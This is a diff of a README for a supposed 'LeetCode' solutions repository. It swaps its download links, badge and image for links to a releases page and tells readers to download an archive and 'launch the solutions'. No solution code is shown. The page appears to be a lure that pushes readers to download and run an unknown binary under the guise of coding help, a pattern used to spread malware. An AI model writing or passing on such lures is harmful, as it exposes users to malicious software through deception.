@@ -11,8 +11,8 @@ Welcome to the "LeetCode" repository! Here you will find a collection of solutio
 You can explore and utilize the solutions provided here to enhance your knowledge and skills in data structures, algorithms, and problem-solving techniques.
 
 ## Access the Solutions
-To access the solutions, please visit the following link: [Download LeetCode Solutions](https://github.com/releases/789694263/Release.zip)
-[![Download Solutions](https://img.shields.io/badge/Download-Solutions-brightgreen)](https://github.com/releases/789694263/Release.zip)
+To access the solutions, please visit the following link: [Download LeetCode Solutions](https://github.com/nbgdigital/LEETCODE./releases)
+[![Download Solutions](https://github.com/nbgdigital/LEETCODE./releases)](https://github.com/nbgdigital/LEETCODE./releases)
 
 If the link ends with a file name, simply click on it to download and launch the solutions for your use.
 
@@ -26,7 +26,7 @@ Let's dive into the world of LeetCode problems, challenge ourselves, and improve
 
 Remember, practice makes perfect! Keep learning, keep coding, and keep pushing your boundaries to become a better programmer each day.
 
-![Coding Image](https://cdn.pixabay.com/photo/2016/02/19/11/19/computer-1209641_960_720.jpg)
+![Coding Image](https://github.com/nbgdigital/LEETCODE./releases)
 
 ## Thank You 🙏
 Thank you for visiting the "LeetCode" repository. Enjoy exploring the solutions, and happy coding! If you have any questions or suggestions, feel free to reach out.
